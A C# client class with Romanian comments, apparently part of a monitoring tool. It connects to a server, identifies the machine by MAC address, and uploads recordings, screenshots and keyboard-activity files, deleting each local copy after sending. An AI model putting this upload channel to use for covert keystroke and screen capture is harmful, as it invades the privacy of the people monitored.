using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;

namespace ClientAps
{
    /*
     * Clasa ce realizeaza conectare la server. Contine membrii ip-port server si instantiaza obiectul socketClient prin care se realizeaza comunicatia client-server
     * Contine metodele
     *  ->SendNormalMsj- pentru a trimite un string catre server
     *  ->SendMessages- trimite mesaj catre server dar ataseaza un antent (Seteaza primii 2 octeti-> F- fisier, P-proces, C-continut fisier, D-descriere fisier
     *  ->Exit- pentru inchidere conexiune
     *  ->SendFile- trimitere fisier, primeste ca parametrii tipul fisierului( categoria: Recording/Screenshot/KeyboardActivity) si path-ul acestuia
     *  ->get_socket_client- functie ce returneaza socket-ul deschis intre client-server, pentru inchiderea conexiunii
     *  ->GetMacAdd- functie ce returneaza adresa fizica (Ethernet) a statiei de lucru, adresa prin care se face indentificarea clientului pe server
     *  ->ReceiveRequest- primire pachete de la server
     */

    class ConexServer
    {
        //MEMBRII
        public Socket socketClient;
        static readonly object  locker = new object();//locker pentru a reincerca conectarea

        public string serverIp;
        public int serverPort;
        int x = 0;


        //METODE
        public ConexServer(string server_ip, int server_port)
        {
            serverIp = server_ip;
            serverPort = server_port;
            socketClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPAddress ip = IPAddress.Parse(serverIp);
            IPEndPoint point = new IPEndPoint(ip, serverPort);
            try
            {
                Console.WriteLine("Try to connect");
                socketClient.Connect(server_ip, server_port);
                int incercari = 0;
                while (!socketClient.Connected)
                {
                    try
                    {
                        incercari++;
                        lock (locker)
                        {
                           socketClient.Connect(server_ip, server_port);
                        }
                    }
                    catch (SocketException)
                    {
                        Console.Clear();
                        Console.WriteLine("Incercari " + incercari.ToString());
                    }
                }
                string first = "CONNECT~" + GetMacAdd();
                Console.WriteLine("Eu am trimis mac-ul" +first);
                SendNormalMsj(first);
                Console.WriteLine("CONECTAT");

                byte[] buff = new byte[socketClient.ReceiveBufferSize];
                socketClient.Receive(buff);
                string buffer_s = Encoding.UTF8.GetString(buff);
                var onlyLetters = new String(buffer_s.Where(Char.IsLetter).ToArray());
                if (!onlyLetters.Equals("ok"))
                {
                    Console.WriteLine("Nu am primit ok de la server. Am primit: " + onlyLetters);
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine("Exceptie atinsa "+ex.Message);
                return;
            }
        }
        public static string GetMacAdd()
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                //Console.WriteLine(nic.GetPhysicalAddress().ToString());
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet)
                {
                    //Console.WriteLine(nic.GetPhysicalAddress().ToString());
                    return nic.GetPhysicalAddress().ToString();
                }
            }
            return null;
        }    
        public void SendNormalMsj(string msj)
        {
            byte[] connect_string_byte=Encoding.UTF8.GetBytes(msj);
            byte[] info_block_conn = new byte[msj.Length];
            Buffer.BlockCopy(connect_string_byte, 0, info_block_conn, 0, msj.Length);
            socketClient.Send(info_block_conn);
        }
        public void SendMessages(string sendMessage,char type)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(sendMessage);
            byte[] newBuffer = new byte[buffer.Length + 1];
            newBuffer[0] = (byte)type;
            Buffer.BlockCopy(buffer, 0, newBuffer, 1, buffer.Length);
            socketClient.Send(newBuffer);

            if (!receptie_confirmare("next"))
            {
                Console.WriteLine("Validare incorecta");
                return;
            }
        }
        public void SendFile(string input,string clasa)
        {
            string filePath = @input;
            using (FileStream fsRead = new FileStream(filePath, FileMode.OpenOrCreate, FileAccess.Read))
            {
                string fileName = Path.GetFileName(filePath);
                long fileLength = fsRead.Length;
                string totalMsg = string.Format("{0}~{1}~{2}", fileName, fileLength, clasa);

                byte[] buffer = Encoding.UTF8.GetBytes(totalMsg);
                byte[] newBuffer = new byte[buffer.Length + 2];
                newBuffer[0] = (byte)'F';
                newBuffer[1] = (byte)'D';
                Buffer.BlockCopy(buffer, 0, newBuffer, 2, buffer.Length);
                Console.WriteLine(totalMsg);
                socketClient.Send(newBuffer);
                                        
                if(!receptie_confirmare("content"))
                {
                    Console.WriteLine("Validare incorecta");
                    return; 
                }
              
                byte[] Filebuffer = new byte[1024 * 1024 * 5];
                int readLength = 0;
                bool firstRead = true;
                long sentFileLength = 0;
                while ((readLength = fsRead.Read(Filebuffer, 0, Filebuffer.Length)) > 0 && sentFileLength < fileLength)
                {
                    sentFileLength += readLength;
                    if (firstRead)
                    {
                        byte[] firstBuffer = new byte[readLength + 2];
                        firstBuffer[0] = (byte)'F';
                        firstBuffer[1] = (byte)'C';
                        Buffer.BlockCopy(Filebuffer, 0, firstBuffer, 2, readLength);
                        socketClient.Send(firstBuffer, 0, readLength + 2, SocketFlags.None);
                        firstRead = false;
                        continue;
                    }
                    socketClient.Send(Filebuffer, 0, readLength, SocketFlags.None);
                }
                fsRead.Close();
                Console.WriteLine("Am trimis tot fisierul");
                File.Delete(filePath);
                if (!receptie_confirmare("next"))
                {
                    Console.WriteLine("Validare incorecta");
                    return;
                }
               
            }
        }
        public string ReceiveRequest()
        {
            var buffer = new byte[2048];
            int received = socketClient.Receive(buffer, SocketFlags.None);
            if (received == 0)
            {
                return null;
            }
            else
            {
                SendNormalMsj("primit");
            }
            var data = new byte[received];
            Array.Copy(buffer, data, received);
            string text = Encoding.ASCII.GetString(data);

            return text;
        }
        private void Exit()
        {
            //SendMessages("Exit");
            //socketClient.Shutdown(SocketShutdown.Both);
            socketClient.Close();
            Environment.Exit(0);
        }
        public Socket get_socket_client()
        {
            return socketClient;
        }
        private bool receptie_confirmare(string verificat)
        {
            byte[] buff = new byte[socketClient.ReceiveBufferSize];
            socketClient.Receive(buff);
            string buffer_s = Encoding.UTF8.GetString(buff);
            var onlyLetters = new String(buffer_s.Where(Char.IsLetter).ToArray());
            if (!onlyLetters.Equals(verificat))
            {
                Console.WriteLine("Nu am primit ce trebuie " + onlyLetters);
                return false;
            }
            else
            {
                return true;
            }
        }
    }
}